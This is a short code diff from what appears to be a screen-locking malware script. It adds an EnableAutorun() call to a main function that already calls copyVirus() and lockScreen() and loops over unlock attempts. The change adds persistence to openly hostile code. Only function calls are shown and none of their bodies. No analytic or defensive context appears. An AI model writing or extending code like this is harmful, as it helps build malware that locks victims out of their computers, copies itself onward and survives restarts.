@@ -78,6 +78,7 @@ function unlock()
 end
 
 function main()
+  EnableAutorun()
   copyVirus()
   lockScreen()
   while attempts < MAX_ATTEMPTS do
